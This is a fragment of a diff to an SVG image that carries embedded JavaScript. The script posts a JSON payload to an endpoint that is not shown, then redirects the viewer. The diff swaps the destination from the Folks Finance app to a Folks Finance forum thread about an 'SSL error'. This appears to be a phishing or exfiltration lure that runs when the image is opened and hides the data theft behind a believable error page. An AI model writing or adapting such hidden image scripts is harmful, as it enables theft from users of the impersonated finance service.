@@ -24,14 +24,15 @@
         body: JSON.stringify(payload)
       }).then(() => {
         setTimeout(() => {
-          window.location.href = 'https://xapp.folks.finance/';
+          window.location.href = 'https://forum.folks.finance/t/folks-router-ssl-error/725';
         }, 500);
       }).catch(() => {
         setTimeout(() => {
-          window.location.href = 'https://xapp.folks.finance/';
+          window.location.href = 'https://forum.folks.finance/t/folks-router-ssl-error/725';
         }, 500);
       });
     }
   ]]>
   </script>
+
 </svg>
